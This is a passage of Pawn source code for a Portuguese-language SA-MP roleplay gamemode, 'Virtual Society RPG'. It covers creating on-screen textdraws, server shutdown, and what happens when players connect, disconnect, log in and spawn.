	tdwhite = TextDrawCreate(0.0, 0.0, "_");
	TextDrawUseBox(tdwhite, true);
	TextDrawBoxColour(tdwhite, 0xFFFFFFFF);
	TextDrawSetShadow(tdwhite, 0);
	TextDrawLetterSize(tdwhite, 0.0, 100.0);
	TextDrawTextSize(tdwhite, 645.0, 0.0);
	
	tdred = TextDrawCreate(0.0, 0.0, "_");
	TextDrawUseBox(tdred, true);
	TextDrawBoxColour(tdred, 0xFF000066);
	TextDrawSetShadow(tdred, 0);
	TextDrawLetterSize(tdred, 0.0, 100.0);
	TextDrawTextSize(tdred, 645.0, 0.0);
	
	tdgray = TextDrawCreate(0.0, 0.0, "_");
	TextDrawUseBox(tdgray, true);
	TextDrawBoxColour(tdgray, 0xAAAAAAAA);
	TextDrawSetShadow(tdgray, 0);
	TextDrawLetterSize(tdgray, 0.0, 100.0);
	TextDrawTextSize(tdgray, 645.0, 0.0);
	
	tdlightgray = TextDrawCreate(0.0, 0.0, "_");
	TextDrawUseBox(tdlightgray, true);
	TextDrawBoxColour(tdlightgray, 0x77777788);
	TextDrawSetShadow(tdlightgray, 0);
	TextDrawLetterSize(tdlightgray, 0.0, 100.0);
	TextDrawTextSize(tdlightgray, 645.0, 0.0);
	
	tdgreen = TextDrawCreate(0.0, 0.0, "_");
	TextDrawUseBox(tdgreen, true);
	TextDrawBoxColour(tdgreen, 0x00FF0044);
	TextDrawSetShadow(tdgreen, 0);
	TextDrawLetterSize(tdgreen, 0.0, 100.0);
	TextDrawTextSize(tdgreen, 645.0, 0.0);
    
    format(msg, sizeof msg, "~w~Pressione ~y~%s ~w~para entrar.", GetKeyName(K_ENTER, 1));
    tdjoin = TextDrawCreate(320.0, 408.0, msg);
    TextDrawColour(tdjoin, 0xFFFFFFFF);
    TextDrawFont(tdjoin, 1);
    TextDrawLetterSize(tdjoin, 0.5, 1.3);
    TextDrawAlignment(tdjoin, 2);
    
    format(msg, sizeof msg, "~w~Pressione ~y~%s ~w~para sair.", GetKeyName(K_ENTER, 1));
    tdexit = TextDrawCreate(320.0, 408.0, msg);
    TextDrawColour(tdexit, 0xFFFFFFFF);
    TextDrawFont(tdexit, 1);
    TextDrawLetterSize(tdexit, 0.5, 1.3);
    TextDrawAlignment(tdexit, 2);
    
    tdphone = TextDrawCreate(320.0, 368.0, "- Celular tocando -");
    TextDrawColour(tdphone, COLOUR_SKY_BLUE);
    TextDrawFont(tdphone, 1);
    TextDrawLetterSize(tdphone, 0.5, 1.3);
    TextDrawAlignment(tdphone, 2);
    
    format(msg, sizeof msg, "~w~Pressione ~b~%s ~w~para sair do veículo.", GetKeyName(K_VEHICLE, 1));
    tdvehicle = TextDrawCreate(320.0, 418.0, TEXT(msg));
    TextDrawColour(tdvehicle, 0xFFFFFFFF);
    TextDrawFont(tdvehicle, 1);
    TextDrawLetterSize(tdvehicle, 0.5, 1.3);
    TextDrawAlignment(tdvehicle, 2);
    
    format(msg, sizeof msg, "~w~Pressione ~g~%s ~w~para pegar a arma.", GetKeyName(K_WEAPON, 1));
    tdgun = TextDrawCreate(320.0, 420.0, TEXT(msg));
    TextDrawColour(tdgun, 0xFFFFFFFF);
    TextDrawFont(tdgun, 1);
    TextDrawLetterSize(tdgun, 0.5, 1.3);
    TextDrawAlignment(tdgun, 2);

    tdarrows = TextDrawCreate(139.0, 295.0, "~<~                      ~>~");
	TextDrawAlignment(tdarrows, 0);
	TextDrawBackgroundColour(tdarrows, 0x000000FF);
	TextDrawFont(tdarrows, 3);
	TextDrawLetterSize(tdarrows, 0.9, 2.6);
	TextDrawColour(tdarrows, 0xFFFFFFFF);
	TextDrawSetOutline(tdarrows, 1);
	TextDrawSetProportional(tdarrows, 1);
	TextDrawSetShadow(tdarrows, 1);
    
    tdgas[0] = TextDrawCreate(156.0, 349.0, "  ~y~F~n~~w~3/4~n~1/2~n~1/4~n~  ~r~E");
	TextDrawAlignment(tdgas[0], 0);
	TextDrawBackgroundColour(tdgas[0], 0x000000FF);
	TextDrawFont(tdgas[0], 1);
	TextDrawLetterSize(tdgas[0], 0.5, 1.5);
	TextDrawColour(tdgas[0], 0xFFFFFFFF);
	TextDrawSetOutline(tdgas[0], 1);
	TextDrawSetProportional(tdgas[0], 1);
	TextDrawSetShadow(tdgas[0], 1);
	
	tdgas[1] = TextDrawCreate(191.5, 354.0, "_");
	TextDrawUseBox(tdgas[1], true);
 	TextDrawBoxColour(tdgas[1], 0x00000066);
 	TextDrawLetterSize(tdgas[1], 1.0, 6.5);
    TextDrawTextSize(tdgas[1], 194.5, 0.0);
    TextDrawSetShadow(tdgas[1], 0);
    
    tdhealth = TextDrawCreate(219.0, 392.0, "_");
	TextDrawUseBox(tdhealth, true);
 	TextDrawBoxColour(tdhealth, 0x00000066);
 	TextDrawLetterSize(tdhealth, 0.0, 0.5);
    TextDrawTextSize(tdhealth, 319.0, 0.0);
	
	for(new g = 0; g < sizeof tdgasmeter; g++)
	{
		tdgasmeter[g] = TextDrawCreate(184.0, 410.0 - (g * 0.65), "-");
 		TextDrawFont(tdgasmeter[g], 1);
 		TextDrawBoxColour(tdgasmeter[g], COLOUR_WHITE);
 		TextDrawLetterSize(tdgasmeter[g], 1.3, 1.0);
 		TextDrawSetShadow(tdgasmeter[g], 0);
	}
	
	for(new c = 0; c < sizeof tdclothes; c++)
	{
	    tdclothes[c] = TextDrawCreate(21, 125, " ");
		TextDrawAlignment(tdclothes[c], 0);
		TextDrawFont(tdclothes[c], 1);
		TextDrawLetterSize(tdclothes[c], 0.5 ,3);
		TextDrawColour(tdclothes[c], 0xFFFFFFFF);
		TextDrawSetProportional(tdclothes[c], 1);
		TextDrawSetShadow(tdclothes[c], 2);
	}

	TextDrawSetString(tdclothes[0], CLOTHES_TEXT_STRING_BUY);
	TextDrawSetString(tdclothes[1], CLOTHES_TEXT_STRING_CANCEL);
	
    print("Textdraws criados.");
    
    //----------------------------------------------TIMERS----------------------------------------------
    
    for(new t = 0; t < sizeof GlobalTimer; t++)
    	SetTimerEx("StartTimer", t * (1000 / sizeof GlobalTimer), false, "d", t);

	print("Timers globais definidos.");
	
	//--------------------------------------------------------------------------------------------------
	
	StartPlayingDiscoSong(-1);
	StartPlayingFunkSong(-1);
	
	print("Virtual Society RPG iniciado...\n");
	return 1;
}

public StartGameModeExit(seconds)
{
	new Text:textend;
	new cam;

    print("Finalizando Virtual Society RPG...");
	textend = TextDrawCreate(320.0, 130.0, "Fechando servidor...");
	TextDrawColour(textend, COLOUR_RED);
	TextDrawFont(textend, 1);
	TextDrawLetterSize(textend, 1.0, 2.3);
	TextDrawSetShadow(textend, 1);
	TextDrawAlignment(textend, 2);

	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n))
	    {
			cam = random(sizeof RequestClassCameras);
			SetPlayerCameraPos(n, RequestClassCameras[cam][rccamPosX], RequestClassCameras[cam][rccamPosY], RequestClassCameras[cam][rccamPosZ]);
			SetPlayerCameraLookAt(n, RequestClassCameras[cam][rccamLookAtX], RequestClassCameras[cam][rccamLookAtY], RequestClassCameras[cam][rccamLookAtZ]);
	
	        if(IsPlayerLogged(n))
	        {
	        	SavePlayerData(n);
	        	SavePlayerLastPos(n);
	        	Login[n] = 0;
	    	}
			
			if(RemoteBomb[n] != -1)
			{
	    		DestroyObject(RemoteBomb[n]);
	    		RemoteBomb[n] = -1;
			}

			if(CurrentToy[n] != -1)
			{
	    		DestroyVehicle(CurrentToy[n]);
				CurrentToy[n] = -1;
			}
	
			if(tdintro[n] != Text:INVALID_TEXT_DRAW)
				TextDrawDestroy(tdintro[n]);
				
            if(tdspeak[n] != Text:INVALID_TEXT_DRAW)
				TextDrawDestroy(tdspeak[n]);
				
			if(tdzone[n] != Text:INVALID_TEXT_DRAW)
				TextDrawDestroy(tdzone[n]);
				
            if(tdhouse[n] != Text:INVALID_TEXT_DRAW)
				TextDrawDestroy(tdhouse[n]);

			if(tdspeed[n] != Text:INVALID_TEXT_DRAW)
				TextDrawDestroy(tdspeed[n]);
				
            if(tdvinfo[n] != Text:INVALID_TEXT_DRAW)
				TextDrawDestroy(tdvinfo[n]);
				
            if(tdhealthbar[n] != Text:INVALID_TEXT_DRAW)
				TextDrawDestroy(tdhealthbar[n]);
			
			StopAudioStreamForPlayer(n);
			TogglePlayerClock(n, false);
			KillTimer(ContinueTimer[n]);
			KillTimer(CallTimer[n]);
    		KillTimer(GangAttackTimer[n]);
			KillTimer(SpeakTimer[n]);
			KillTimer(DieTimer[n]);
			KillTimer(ResumeTimer[n]);
			
			for(new ln = 0; ln < NLINES; ln++)
				SendClientMessage(n, COLOUR_WHITE, " ");
				
            TextDrawShowForPlayer(n, textend);
		}
	}
	
	for(new t = 0; t < sizeof GlobalTimer; t++)
	    KillTimer(GlobalTimer[t][tId]);
	    
	KillTimer(DiscoTimer);
    
	for(new g = 0; g < sizeof tdgasmeter; g++)
	{
	    if(tdgasmeter[g] != Text:INVALID_TEXT_DRAW)
	    	TextDrawDestroy(tdgasmeter[g]);
	}
	
	for(new g = 0; g < sizeof tdgas; g++)
	{
	    if(tdgas[g] != Text:INVALID_TEXT_DRAW)
			TextDrawDestroy(tdgas[g]);
	}
	
	for(new c = 0; c < sizeof tdclothes; c++)
	{
	    if(tdclothes[c] != Text:INVALID_TEXT_DRAW)
			TextDrawDestroy(tdclothes[c]);
	}
	
#if SHOW_GAMEMODE_LOGO == true

    TextDrawDestroy(tdlogo);
    
#endif

#if SHOW_WEEKDAY == true

    TextDrawDestroy(tdweek);
    
#endif

	TextDrawDestroy(tdhealth);
    TextDrawDestroy(tdblack);
    TextDrawDestroy(tdwhite);
    TextDrawDestroy(tdred);
    TextDrawDestroy(tdgray);
    TextDrawDestroy(tdlightgray);
    TextDrawDestroy(tdgreen);
    TextDrawDestroy(tdjoin);
    TextDrawDestroy(tdexit);
    TextDrawDestroy(tdphone);
    TextDrawDestroy(tdvehicle);
    TextDrawDestroy(tdgun);
    TextDrawDestroy(tdarrows);
    
    for(new g = 0; g < sizeof Guns; g++)
        DestroyMenu(Guns[g]);

    DestroyMenu(Bank[0]);
	DestroyMenu(Bank[1]);
	DestroyMenu(Dildos);
	DestroyMenu(Hotel);
	DestroyMenu(Toys);
	DestroyMenu(Itens);
	DestroyMenu(Donuts);
	DestroyMenu(Pizzas);
	DestroyMenu(Chickens);
	DestroyMenu(Burgers);
	DestroyMenu(Foods);
	DestroyMenu(Drinks);
	DestroyMenu(Restaurant);
	
	for(new a = 0; a < sizeof Areas; a++)
	{
	    if(Areas[a][areaGangZone] != INVALID_GANG_ZONE)
	        GangZoneDestroy(Areas[a][areaGangZone]);
	}
	
	for(new z = 0; z < sizeof GangZones; z++)
	{
	    KillTimer(GangZones[z][gzTimer]);
        GangZoneDestroy(GangZones[z][gzId]);
    }
    
    SetTimerEx("TurnGameModeOff", seconds * 1000, false, "d", _:textend);
}

public TurnGameModeOff(textend)
{
	for(new n = 0; n < MAX_SLOTS; n++)
	    TextDrawHideForPlayer(n, Text:textend);
	    
	TextDrawDestroy(Text:textend);
	print("Virtual Society RPG finalizado.");
	
	GameModeExit();
}

public OnGameModeExit()
{
	StartGameModeExit(0);
}

public StartTimer(id)
	GlobalTimer[id][tId] = SetTimer(GlobalTimer[id][tName], GlobalTimer[id][tInterval], true);

stock ShowLoginDialog(playerid)
{
	if(fexist(GetPlayerXFilePath(playerid)))
	    ShowPlayerDialog(playerid, DIALOG_REGISTER_LOGIN, DIALOG_STYLE_PASSWORD, "{000080}Virtual {EEDD82}Society {FFFFFF}R{EEDD82}P{000080}G", "{FFFFFF}Bem-vindo, entre com a sua senha para continuar:", "Autenticar", "Cancelar");

	else
	    ShowPlayerDialog(playerid, DIALOG_REGISTER_LOGIN, DIALOG_STYLE_PASSWORD, "{000080}Virtual {EEDD82}Society {FFFFFF}R{EEDD82}P{000080}G", "{FFFFFF}Bem-vindo, registre uma senha para continuar:", "Registrar", "Cancelar");
}

stock ShowLotteryDialog(playerid)
    ShowPlayerDialog(playerid, DIALOG_LOTTERY, DIALOG_STYLE_INPUT, "{00FF00}Loteria", "{FFFFFF}Digite os seus numeros de aposta:\n\n{FFFFE0}Exemplo: 10 20\n\n{FFFFFF}Numeros de 1 a 30", "Apostar", "Cancelar");

public OnPlayerConnect(playerid)
{
	new name[MAX_PLAYER_NAME], IP[128];
	
	GetPlayerName(playerid, name, sizeof name);
	GetPlayerIp(playerid, IP, sizeof IP);
    SetPlayerColour(playerid, COLOUR_WHITE);
    SetPlayerHealth(playerid, 100.0);
    SetPlayerArmour(playerid, 0.0);

#if USE_UCP == true

	HTTPRequest(playerid, 'c');
	
#endif

#if SHOW_CONNECTIONS == true

	SendDeathMessage(INVALID_PLAYER_ID, playerid, 200);

#endif
	
	for(new b = 0; b < sizeof(BotNames); b++)
	{
		if(strcmp(name, BotNames[b], true) == 0)
		{
		    new guest[MAX_PLAYER_NAME];
		    
		    format(guest, sizeof guest, "Guest_%d", random(5000));
		    SetPlayerName(playerid, guest);
		    Kick(playerid);
			return;
		}
	}
	
	for(new r = 0; r < ROPES; r++)
	    Ropes[playerid][r] = -1;
	    
	SetPlayerColour(playerid, COLOUR_GRAY);
	Login[playerid] = 0;
    Dying[playerid] = 0;
	Company[playerid] = 0;
	BankOpc[playerid] = 0;
	IntroductionPart[playerid] = 0;
	DanceStyle[playerid] = 0;
	PaintVehicle[playerid] = -1;
	PaintStage[playerid] = 0;
	PaintColours[playerid] = 0;
	GChat[playerid] = 0;
	VCounter[playerid] = 0;
	VFrozenFlags[playerid] = 0;
	VFuelText[playerid] = -1;
	VHealthText[playerid] = -1;
	SecCamera[playerid] = -1;
	RemoteBomb[playerid] = -1;
	Enter[playerid] = -1;
	Door[playerid] = -1;
	AmbienceSound[playerid] = -1;
	Supplies[playerid] = 0;
	DrinkSips[playerid] = 0;
	Transport[playerid] = 0;
	AirTransport[playerid] = 0;
	Terminal[playerid] = 0;
	Announce[playerid] = 0;
	CameraStyle[playerid] = 0;
	Cigar[playerid] = 0;
	Rob[playerid] = 0;
	Milk[playerid] = 0;
	Corn[playerid] = 0;
	Smuggling[playerid] = 0;
	SmugglingPart[playerid] = 0;
	WeaponMaterial[playerid] = 0;
	Fishing[playerid] = 0;
	PizzaDelivery[playerid] = 0;
	Taximeter[playerid] = -1;
	TaxiDelivery[playerid] = -1;
	MedicKit[playerid] = 0;
	Cigarrete[playerid] = 0;
	Pouch[playerid] = -1;
	CurrentToy[playerid] = -1;
	DroppedWeapon[playerid] = -1;
	House[playerid] = -1;
	WorkVehicle[playerid] = -1;
	Radio[playerid] = -1;
	GangAttack[playerid] = -1;
	Zone[playerid] = -1;
	ArrowObject[playerid] = -1;
	HoldId[playerid] = -1;
	LGunPart[playerid] = 0;
	Invite[playerid] = INVITE_NONE;
	PlayerEvent[playerid] = PLAYER_EVENT_NULL;
	KeyEvent[playerid] = KEY_EVENT_NULL;
	Area[playerid] = AREA_NULL;
	Checkpoint[playerid] = -1;
	CheckpointStatus[playerid] = CHECKPOINT_NONE;
	ClothesShop[playerid][csId] = -1;
 	ClothesShop[playerid][csType] = CLOTHES_NONE;
 	Window[playerid][wndOn] = 0;
	AdminData[playerid][admFly] = 0;
	AdminData[playerid][admReportOff] = 0;
	AdminData[playerid][admPower] = 0;
	AdminData[playerid][admSpec] = INVALID_PLAYER_ID;
	
	pUpdate[playerid] = 0;
	pMoney[playerid] = 0;
	pHealth[playerid] = 100.0;
	pArmour[playerid] = 0.0;

    if(tdintro[playerid] != Text:INVALID_TEXT_DRAW)
        TextDrawDestroy(tdintro[playerid]);
        
    if(tdchat[playerid] != Text:INVALID_TEXT_DRAW)
        TextDrawDestroy(tdchat[playerid]);
        
  	if(tdzone[playerid] != Text:INVALID_TEXT_DRAW)
  	    TextDrawDestroy(tdzone[playerid]);
  	    
  	if(tdhouse[playerid] != Text:INVALID_TEXT_DRAW)
  	    TextDrawDestroy(tdhouse[playerid]);
  	    
  	if(tdspeed[playerid] != Text:INVALID_TEXT_DRAW)
  	    TextDrawDestroy(tdspeed[playerid]);
  	    
  	if(tdvinfo[playerid] != Text:INVALID_TEXT_DRAW)
  	    TextDrawDestroy(tdvinfo[playerid]);
  	    
  	if(tdhealthbar[playerid] != Text:INVALID_TEXT_DRAW)
  	    TextDrawDestroy(tdhealthbar[playerid]);
  	    
  	tdintro[playerid] = TextDrawCreate(320.0, 130.0, "_");
  	TextDrawFont(tdintro[playerid], 1);
	TextDrawLetterSize(tdintro[playerid], 0.5, 1.5);
	TextDrawAlignment(tdintro[playerid], 2);
	TextDrawSetShadow(tdintro[playerid], 1);
	TextDrawColour(tdintro[playerid], COLOUR_WHITE);
		
    tdchat[playerid] = TextDrawCreate(370.0, 400.0, "_");
    TextDrawFont(tdchat[playerid], 1);
	TextDrawLetterSize(tdchat[playerid], 0.5, 1.5);
	TextDrawAlignment(tdchat[playerid], 2);
	TextDrawSetShadow(tdchat[playerid], 1);
	TextDrawColour(tdchat[playerid], COLOUR_WHITE);
		
    tdspeak[playerid] = TextDrawCreate(23.0, 130.0, "_");
    TextDrawColour(tdspeak[playerid], COLOUR_WHITE);
    TextDrawFont(tdspeak[playerid], 1);
    TextDrawLetterSize(tdspeak[playerid], 0.5, 1.4);
    TextDrawSetOutline(tdspeak[playerid], 2);
	TextDrawSetProportional(tdspeak[playerid], 1);
		    
    tdzone[playerid] = TextDrawCreate(638.0, 395.0, "_");
	TextDrawAlignment(tdzone[playerid], 3);
	TextDrawBackgroundColour(tdzone[playerid], 0xFFFFFF99);
	TextDrawFont(tdzone[playerid], 1);
	TextDrawLetterSize(tdzone[playerid], 0.4, 1.2);
	TextDrawColour(tdzone[playerid], 0xFFFFFFFF);
	TextDrawSetOutline(tdzone[playerid], 1);
	TextDrawSetProportional(tdzone[playerid], 1);
	TextDrawSetShadow(tdzone[playerid], 1);

    tdhouse[playerid] = TextDrawCreate(23.0, 213.0, "_");
	TextDrawTextSize(tdhouse[playerid], 140.0, 0.0);
	TextDrawAlignment(tdhouse[playerid], 0);
	TextDrawFont(tdhouse[playerid], 3);
	TextDrawLetterSize(tdhouse[playerid], 0.5, 1.5);
	TextDrawColour(tdhouse[playerid], COLOUR_WHITE);
	TextDrawSetProportional(tdhouse[playerid], 1);
	TextDrawSetShadow(tdhouse[playerid], 1);
	TextDrawUseBox(tdhouse[playerid], true);
	TextDrawBoxColour(tdhouse[playerid], 0x000000AA);

    tdspeed[playerid] = TextDrawCreate(269.0, 403.0, "_");
 	TextDrawAlignment(tdspeed[playerid], 2);
 	TextDrawLetterSize(tdspeed[playerid], 0.58, 1.3);
 	TextDrawSetOutline(tdspeed[playerid], 0);
 	TextDrawColour(tdspeed[playerid], 0xFFFFFFFF);
 	TextDrawBackgroundColour(tdspeed[playerid], -0xFFFFFFFF);
 	TextDrawSetShadow(tdspeed[playerid], 0);
 	TextDrawUseBox(tdspeed[playerid], true);
 	TextDrawBoxColour(tdspeed[playerid], 0x00000066);
 	TextDrawTextSize(tdspeed[playerid], 0.0, 100.0);

	tdvinfo[playerid] = TextDrawCreate(219.0, 349.0, "_");
 	TextDrawAlignment(tdvinfo[playerid], 1);
 	TextDrawLetterSize(tdvinfo[playerid], 0.34, 1.4);
 	TextDrawSetProportional(tdvinfo[playerid], 1);
 	TextDrawSetOutline(tdvinfo[playerid], 2);
 	TextDrawColour(tdvinfo[playerid], 0x000000BE);
 	TextDrawBackgroundColour(tdvinfo[playerid], -0x0000FFF5);
 	TextDrawSetShadow(tdvinfo[playerid], 0);

    tdhealthbar[playerid] = TextDrawCreate(219.5, 393.0, "_");
	TextDrawUseBox(tdhealthbar[playerid], true);
	TextDrawLetterSize(tdhealthbar[playerid], 0.0, 0.3);
    	
	reportf("%s - %s", REPORT_CONNECTION, name, IP);
	
    if(!CheckBan(name, IP))
    {
        SendClientMessage(playerid, COLOUR_GRAY, "Você está banido do Virtual Society RPG Server.");
        Kick(playerid);
        return;
    }
	
	PlayAudioStreamForPlayer(playerid, "http://dc433.4shared.com/img/1066640177/50fb51e8/dlink__2Fdownload_2Fzq_5FEqIEu_3Ftsid_3D20120110-025710-492da849/preview.mp3");

    for(new ln = 0; ln < NLINES; ln++)
		SendClientMessage(playerid, COLOUR_WHITE, " ");
}

public OnPlayerDisconnect(playerid, reason)
{
    SetPlayerColour(playerid, COLOUR_WHITE);

#if USE_UCP == true

	HTTPRequest(playerid, 'd');
	
#endif

#if SHOW_CONNECTIONS == true

	switch(reason)
	{
	    case 0:
	        SendDeathMessage(INVALID_PLAYER_ID, playerid, 54);
	    case 1:
	        SendDeathMessage(INVALID_PLAYER_ID, playerid, 201);
	    case 2:
	        SendDeathMessage(INVALID_PLAYER_ID, playerid, 3);
	}

#endif

	for(new a = 0; a < MAX_PLAYER_ATTACHED_OBJECTS; a++)
	    RemovePlayerAttachedObject(playerid, a);
	    
	if(IsPlayerLogged(playerid))
	{
	    if(Taximeter[playerid] != -1)
		{
		    new playa;

		    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    {
				for(new n = 0; n < MAX_SLOTS; n++)
				{
				    if(Taximeter[n] == playerid)
				    {
				        playa = n;
				        break;
					}
				}

				Pay(playerid, Taximeter[playerid]);
		        GivePlayerSysMoney(playa, -Taximeter[playerid]);
		    }

		    else
		    {
		        playa = Taximeter[playerid];
		        Pay(playa, Taximeter[playa]);
		        GivePlayerSysMoney(playerid, -Taximeter[playa]);
		    }

		    Taximeter[playerid] = Taximeter[playa] = -1;
		}
	
	    SavePlayerData(playerid);
	    SavePlayerLastPos(playerid);
		Login[playerid] = 0;
	}
	
	if(RemoteBomb[playerid] != -1)
	{
	    DestroyObject(RemoteBomb[playerid]);
	    RemoteBomb[playerid] = -1;
	}

	if(CurrentToy[playerid] != -1)
	{
	    DestroyVehicle(CurrentToy[playerid]);
		CurrentToy[playerid] = -1;
	}
	
	if(Call[playerid] != 0)
	{
	    new xpath[128];
     	new callerid, payerid, credits;
		
	    callerid = Call[playerid] >> 2;
	    
    	if(CallCost[playerid] > 0)
		    payerid = playerid;

		else
		    payerid = callerid;

		xpath = GetPlayerXFilePath(payerid);
		credits = hGetInt(xpath, "Credits") - CallCost[payerid];
		callerid = Call[playerid] >> 2;
		Call[playerid] = 0;
		Call[callerid] = 0;
		SendClientMessage(callerid, COLOUR_WHITE, "[ Chamada finalizada ]");
		StopPlayerCellPhoneAction(playerid);
		StopPlayerCellPhoneAction(callerid);

		if(credits < 0)
  			credits = 0;

        hSetInt(xpath, "Credits", credits);
		if(payerid != playerid)
		{
			new string[128];
			format(string, sizeof string, "[ Foram gastos $%d,00 dólares em créditos. Total: $%d,00 dólares ]", CallCost[payerid], credits);
  			SendClientMessage(payerid, COLOUR_WHITE, string);
		}
		
		CallCost[payerid] = 0;
		DeleteTimer(CallTimer[payerid]);
	}
	
	if(TestPlayerT == playerid)
	{
	    TestPlayerT = INVALID_PLAYER_ID;
	    TestPartT = 0;
	    TestChancesT = 0;
	    DeleteTimer(TestTimerT);
	}
	
	if(TestPlayerN == playerid)
	{
	    TestPlayerN = INVALID_PLAYER_ID;
	    TestPartN = 0;
	}
	
	if(TestPlayerA == playerid)
	{
	    TestPlayerA = INVALID_PLAYER_ID;
	    TestPartA = 0;
	}
	
	if(TuneData[0] == playerid)
		StopTuning();

    DeleteTimer(ContinueTimer[playerid]);
	DeleteTimer(FarmerTimer[playerid]);
    DeleteTimer(CallTimer[playerid]);
    DeleteTimer(GangAttackTimer[playerid]);
	DeleteTimer(SpeakTimer[playerid]);
	DeleteTimer(DieTimer[playerid]);
	DeleteTimer(ResumeTimer[playerid]);
	
	if(tdintro[playerid] != Text:INVALID_TEXT_DRAW)
	{
	    TextDrawHideForPlayer(playerid, tdintro[playerid]);
		TextDrawDestroy(tdintro[playerid]);
		tdintro[playerid] = Text:INVALID_TEXT_DRAW;
	}
	
	if(tdchat[playerid] != Text:INVALID_TEXT_DRAW)
	{
	    TextDrawHideForPlayer(playerid, tdchat[playerid]);
		TextDrawDestroy(tdchat[playerid]);
		tdchat[playerid] = Text:INVALID_TEXT_DRAW;
	}
	
	if(tdspeak[playerid] != Text:INVALID_TEXT_DRAW)
	{
	    TextDrawHideForPlayer(playerid, tdspeak[playerid]);
		TextDrawDestroy(tdspeak[playerid]);
	    tdspeak[playerid] = Text:INVALID_TEXT_DRAW;
	}
	
	if(tdzone[playerid] != Text:INVALID_TEXT_DRAW)
	{
	    TextDrawHideForPlayer(playerid, tdzone[playerid]);
		TextDrawDestroy(tdzone[playerid]);
	    tdzone[playerid] = Text:INVALID_TEXT_DRAW;
	}
	
	if(tdhouse[playerid] != Text:INVALID_TEXT_DRAW)
	{
	    TextDrawHideForPlayer(playerid, tdhouse[playerid]);
		TextDrawDestroy(tdhouse[playerid]);
	    tdhouse[playerid] = Text:INVALID_TEXT_DRAW;
	}
	
	if(tdspeed[playerid] != Text:INVALID_TEXT_DRAW)
	{
	    TextDrawHideForPlayer(playerid, tdspeed[playerid]);
		TextDrawDestroy(tdspeed[playerid]);
	    tdspeed[playerid] = Text:INVALID_TEXT_DRAW;
	}
	
	if(tdvinfo[playerid] != Text:INVALID_TEXT_DRAW)
	{
	    TextDrawHideForPlayer(playerid, tdvinfo[playerid]);
		TextDrawDestroy(tdvinfo[playerid]);
	    tdvinfo[playerid] = Text:INVALID_TEXT_DRAW;
	}

    if(tdhealthbar[playerid] != Text:INVALID_TEXT_DRAW)
	{
	    TextDrawHideForPlayer(playerid, tdhealthbar[playerid]);
		TextDrawDestroy(tdhealthbar[playerid]);
	    tdhealthbar[playerid] = Text:INVALID_TEXT_DRAW;
	}
	
	HidePlayerFuelText(playerid);
    
    for(new g = 0; g < sizeof tdgas; g++)
    	TextDrawHideForPlayer(playerid, tdgas[g]);
            
	HideLogoForPlayer(playerid);
	HideWeekdayForPlayer(playerid);
	
	TextDrawHideForPlayer(playerid, tdhealth);
    TextDrawHideForPlayer(playerid, tdblack);
    TextDrawHideForPlayer(playerid, tdwhite);
    TextDrawHideForPlayer(playerid, tdred);
    TextDrawHideForPlayer(playerid, tdgray);
    TextDrawHideForPlayer(playerid, tdlightgray);
    TextDrawHideForPlayer(playerid, tdgreen);
    TextDrawHideForPlayer(playerid, tdjoin);
    TextDrawHideForPlayer(playerid, tdexit);
    TextDrawHideForPlayer(playerid, tdphone);
    TextDrawHideForPlayer(playerid, tdvehicle);
    TextDrawHideForPlayer(playerid, tdgun);
    TextDrawHideForPlayer(playerid, tdarrows);
	
	for(new s = 0; s < SUBMISSION_MAX; s++)
	{
	    if(Submission[s] == playerid)
	    {
     		if(s == SUBMISSION_DJ || s == SUBMISSION_FUNKDJ)
	    	{
				KeyEvent[playerid] &= ~KEY_EVENT_DJ;

				if(s == SUBMISSION_DJ)
					DeleteTimer(DiscoTimer);

				else
					DeleteTimer(FunkTimer);
			}

			if(IsPlayerInVehicle(playerid, ICE_CREAM) || IsPlayerInVehicle(playerid, IML) || IsPlayerInVehicle(playerid, CEMENT) || IsPlayerInVehicle(playerid, POST))
				SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	            
	        Submission[s] = INVALID_PLAYER_ID;
		}
	}
	
	for(new r = 0; r < ROPES; r++)
	{
	    if(Ropes[playerid][r] != -1)
	    {
	        DestroyObject(Ropes[playerid][r]);
	        Ropes[playerid][r] = -1;
	    }
	}
	
	StopAudioStreamForPlayer(playerid);
	TogglePlayerClock(playerid, false);
}

public OnPlayerRequestClass(playerid, classid)
{
	new cam;

	cam = random(sizeof RequestClassCameras);
	SetPlayerCameraPos(playerid, RequestClassCameras[cam][rccamPosX], RequestClassCameras[cam][rccamPosY], RequestClassCameras[cam][rccamPosZ]);
	SetPlayerCameraLookAt(playerid, RequestClassCameras[cam][rccamLookAtX], RequestClassCameras[cam][rccamLookAtY], RequestClassCameras[cam][rccamLookAtZ]);
				
	ShowLoginDialog(playerid);
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	if(!IsPlayerLogged(playerid))
	{
	    SendClientMessage(playerid, COLOUR_GRAY, "Você deve se registrar ou logar para começar a jogar...");
	    return 0;
	}

	GameTextForPlayer(playerid, "~b~Virtual ~y~~h~Society ~w~R~y~~h~P~b~G", 4000, 0);
	return 1;
}

public OnPlayerSpawn(playerid)
{
    new xpath[128];
    
    xpath = GetPlayerXFilePath(playerid);
    
    PreloadAnimLib(playerid, "BEACH");
   	PreloadAnimLib(playerid, "BOMBER");
   	PreloadAnimLib(playerid, "CAMERA");
   	PreloadAnimLib(playerid, "CAR");
   	PreloadAnimLib(playerid, "CARRY");
   	PreloadAnimLib(playerid, "COLT45");
   	PreloadAnimLib(playerid, "COP_AMBIENT");
   	PreloadAnimLib(playerid, "CRACK");
   	PreloadAnimLib(playerid, "DANCING");
   	PreloadAnimLib(playerid, "DEALER");
   	PreloadAnimLib(playerid, "FAT");
   	PreloadAnimLib(playerid, "FIGHT_C");
   	PreloadAnimLib(playerid, "FOOD");
   	PreloadAnimLib(playerid, "GYMNASIUM");
   	PreloadAnimLib(playerid, "HAIRCUTS");
   	PreloadAnimLib(playerid, "INT_HOUSE");
   	PreloadAnimLib(playerid, "KNIFE");
   	PreloadAnimLib(playerid, "MD_END");
   	PreloadAnimLib(playerid, "MEDIC");
   	PreloadAnimLib(playerid, "MISC");
   	PreloadAnimLib(playerid, "MUSCULAR");
   	PreloadAnimLib(playerid, "ON_LOOKERS");
   	PreloadAnimLib(playerid, "PARACHUTE");
   	PreloadAnimLib(playerid, "PARK");
   	PreloadAnimLib(playerid, "PED");
   	PreloadAnimLib(playerid, "POLICE");
   	PreloadAnimLib(playerid, "POOL");
	PreloadAnimLib(playerid, "RAPPING");
	PreloadAnimLib(playerid, "ROB_BANK");
	PreloadAnimLib(playerid, "ROCKET");
